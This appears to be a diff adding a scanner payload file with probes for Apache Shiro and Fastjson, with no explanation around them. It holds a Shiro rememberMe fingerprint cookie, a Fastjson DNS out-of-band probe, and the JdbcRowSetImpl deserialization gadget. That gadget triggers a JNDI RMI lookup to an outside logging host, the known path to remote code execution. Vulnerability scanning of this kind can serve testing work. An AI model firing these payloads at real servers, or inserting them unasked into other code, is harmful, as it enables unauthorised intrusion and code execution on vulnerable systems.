@@ -1,0 +1,6 @@
+# [Shiro-Detect]
+rememberMe=deleteMe
+
+# [Fastjson-Detect]
+{"@type":"java.net.Inet4Address","val":"fastjson_dns.oob.dnslog.cn"}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://oob.dnslog.cn/a","autoCommit":true}}
